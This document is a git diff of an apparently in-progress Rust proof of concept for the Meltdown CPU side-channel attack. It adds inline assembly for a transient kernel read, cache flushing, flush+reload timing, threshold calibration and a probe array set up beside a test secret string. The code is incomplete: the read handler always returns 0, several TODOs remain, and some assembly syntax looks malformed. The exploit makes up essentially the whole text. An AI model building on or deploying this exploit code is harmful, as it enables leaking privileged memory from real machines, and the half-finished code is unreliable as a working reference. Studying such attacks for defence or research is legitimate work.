@@ -8,14 +8,22 @@ use terminal::{print, println};
 
 use core::arch::asm;
 
-pub fn meltdown_fast(pointer: *const u128) {
+// Taken from https://users.rust-lang.org/t/allocate-mut-f32-on-multiple-of-4kb/58309
+#[repr(align(4096))] // TODO is this necessary?
+#[derive(Copy, Clone)] // Required to initialize an entire array with such objects
+#[allow(dead_code)]
+pub struct MemoryPage([u128; 256]);
+
+pub fn meltdown_fast(mem: &[MemoryPage], pointer: *const u128) {
     unsafe {
         asm!(
             "mov {tmp} [{x}]",
             "shl 12, {tmp}",
             "mov {tmp2} [{base}+{tmp}]",
             x = in(reg) pointer,
+            base = in(reg) &mem[0] as *const MemoryPage,
             tmp = out(reg) _,
+            tmp2 = out(reg) _,
         );
     }
 }
@@ -33,7 +41,7 @@ pub fn rdtsc() -> u64 {
     ((high as u64) << 32) | (low as u64)
 }
 
-pub fn maccess(pointer: *const u128) {
+pub fn maccess(pointer: *const MemoryPage) {
     unsafe {
         asm!(
             "mov {tmp}, [{x}]",
@@ -43,7 +51,7 @@ pub fn maccess(pointer: *const u128) {
     }
 }
 
-pub fn flush(pointer: *const u128) {
+pub fn flush(pointer: *const MemoryPage) {
     unsafe {
         asm!(
             "clflush [{x}]",
@@ -52,7 +60,7 @@ pub fn flush(pointer: *const u128) {
     }
 }
 
-pub fn flush_reload(pointer: *const u128, cache_miss_threshold: u64) -> bool {
+pub fn flush_reload(pointer: *const MemoryPage, cache_miss_threshold: u64) -> bool {
     let start_time: u64;
     let end_time: u64;
     
@@ -65,25 +73,26 @@ pub fn flush_reload(pointer: *const u128, cache_miss_threshold: u64) -> bool {
     end_time - start_time < cache_miss_threshold
 }
 
-pub fn libkdump_read_signal_handler(retries: u32, mem: [u128], pointer: *const u128) -> u32 {
+pub fn libkdump_read_signal_handler(retries: u32, mem: &[MemoryPage], pointer: *const u128) -> usize {
 	for _ in 0..retries {
 		// TODO: Set segmentation fault callback position
-		meltdown_fast(pointer);
+		meltdown_fast(mem, pointer);
 	}
 	
+	return 0;
 }
 
-pub fn libkdump_read(measurements: u32, retries: u32, mem: [u128], accept_after: u32, pointer: *const u128) -> u32 {
+pub fn libkdump_read(measurements: u32, retries: u32, mem: &[MemoryPage], accept_after: u32, pointer: *const u128) -> u32 {
 	const ARRAY_SIZE: usize = 256;
-	let res_stat: [u32; ARRAY_SIZE] = [0; ARRAY_SIZE];
+	let mut res_stat: [u32; ARRAY_SIZE] = [0; ARRAY_SIZE];
 	
 	for _ in 0..measurements {
 		// TODO: Add implementation using TSX?
-		r = libkdump_read_signal_handler(retries, mem, pointer);
+		let r = libkdump_read_signal_handler(retries, mem, pointer);
 		res_stat[r] += 1;
 	}
 	
-	let max_i = res_stat.iter().max();
+	let max_i = *res_stat.iter().max().expect("Couldn't find maximum!");
 	if max_i > accept_after {
 		max_i
 	} else {
@@ -95,8 +104,8 @@ pub fn detect_flush_reload_threshold() -> u64{
     let mut reload_time: u64 = 0;
     let mut flush_reload_time: u64 = 0;
     let count: u64 = 10000000;
-    let dummy: u128 = 0; // TODO Use single value instead of array ok?
-    let pointer: *const u128;
+    let dummy = MemoryPage([0; 256]); // TODO Use single value instead of array ok?
+    let pointer: *const MemoryPage;
     let mut start_time: u64;
     let mut end_time: u64;
     
@@ -130,15 +139,15 @@ pub fn detect_flush_reload_threshold() -> u64{
 #[unsafe(no_mangle)]
 pub fn main() {
     println!("Meltdown start\n");
-    const ARRAY_SIZE: usize = 256 * 256; // 256 entries, each containing 256 u128's, meaning 256*4K
+    const ARRAY_SIZE: usize = 256; // 256 entries, each containing 256 u128's, meaning 256*4K
     const SECRET: &str = "Whoever reads this is dumb.";
     
     println!("Current CPU time: {}", rdtsc());
     let cache_miss_threshold = detect_flush_reload_threshold();
     
-    let mem: [u128; ARRAY_SIZE] = [0; ARRAY_SIZE];
+    let mem: [MemoryPage; ARRAY_SIZE] = [MemoryPage([0; 256]); ARRAY_SIZE];
     
     for i in 0..ARRAY_SIZE {
-        flush(&mem[i] as *const u128);
+        flush(&mem[i] as *const MemoryPage);
     }
 }
